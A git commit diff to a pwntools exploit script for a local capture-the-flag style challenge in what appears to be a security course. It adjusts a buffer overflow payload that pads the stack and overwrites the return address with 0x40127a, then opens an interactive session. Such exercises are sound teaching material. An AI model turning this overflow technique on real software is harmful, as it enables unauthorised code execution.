97fc808b6d9d283c172cb61f413975ce855f79b0
William Mironchuk <wmironchuk@umass.edu>
2022-02-28 20:22:32 -0500

    Finaly Solved main problem

--- chall_1/chall_1.py
+++ chall_1/chall_1.py
@@ -8,9 +8,12 @@ p = pwn.process("/home/cubscout61/Current/CS390R/Projects/project2/chall_1/chall
 pwn.gdb.attach(target=p)
 
 main_payload = bytearray()
-main_payload += b"a" * 28
+main_payload += b"a" * 16
+main_payload += b"b" * 8
 main_payload += pwn.p64(0x40127a)
 
-print(p.recvline())
+print(str(p.recvline(), encoding="ascii"))
 p.sendline(main_payload)
+print(str(main_payload, encoding="ascii"))
+print(p.recvline())
 p.interactive()
